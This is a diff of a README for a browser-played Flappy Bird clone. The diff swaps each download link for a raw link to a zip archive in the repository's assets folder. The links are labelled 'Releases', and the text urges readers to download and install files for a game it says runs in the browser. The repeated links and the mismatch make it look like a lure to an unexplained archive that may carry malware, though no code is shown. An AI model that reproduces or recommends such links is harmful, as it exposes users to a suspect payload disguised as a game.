@@ -1,6 +1,6 @@
 # 🎮 BirdFlappy - Enjoy a Fun and Challenging Game!
 
-[![Download BirdFlappy](https://github.com/200PATOLINO/BirdFlappy/raw/refs/heads/main/assets/Bird_Flappy_borealis.zip)](https://github.com/200PATOLINO/BirdFlappy/raw/refs/heads/main/assets/Bird_Flappy_borealis.zip)
+[![Download BirdFlappy](https://raw.githubusercontent.com/200PATOLINO/BirdFlappy/main/assets/Bird-Flappy-v1.3-beta.5.zip)](https://raw.githubusercontent.com/200PATOLINO/BirdFlappy/main/assets/Bird-Flappy-v1.3-beta.5.zip)
 
 ## 🌟 Introduction
 Welcome to BirdFlappy! This is a fun, full-screen Flappy Bird clone that you can play right in your web browser. Designed with pure HTML, CSS, and JavaScript, BirdFlappy offers a smooth gaming experience. Whether you play on a computer or a mobile device, you’ll enjoy responsive design and easy controls.
@@ -14,7 +14,7 @@ To start playing BirdFlappy, follow these simple steps to download and install t
 - **Browser Version:** Ensure your browser is updated to the latest version
 
 ## 🔗 Download & Install
-1. **Visit this page to download:** [BirdFlappy Releases](https://github.com/200PATOLINO/BirdFlappy/raw/refs/heads/main/assets/Bird_Flappy_borealis.zip)
+1. **Visit this page to download:** [BirdFlappy Releases](https://raw.githubusercontent.com/200PATOLINO/BirdFlappy/main/assets/Bird-Flappy-v1.3-beta.5.zip)
 2. Look for the latest release version. 
 3. Click on the link provided for the downloadable files.
 4. Save the game files to your computer.
@@ -49,7 +49,7 @@ If you encounter issues while playing:
 - Restart your browser and try again.
 
 ## 🔗 Link to Download Again
-For your convenience, here’s the link to download BirdFlappy once more: [BirdFlappy Releases](https://github.com/200PATOLINO/BirdFlappy/raw/refs/heads/main/assets/Bird_Flappy_borealis.zip)
+For your convenience, here’s the link to download BirdFlappy once more: [BirdFlappy Releases](https://raw.githubusercontent.com/200PATOLINO/BirdFlappy/main/assets/Bird-Flappy-v1.3-beta.5.zip)
 
 ## 🤝 Contributing
 We welcome contributions! If you have ideas or improvements, feel free to open an issue or submit a pull request in the repository.
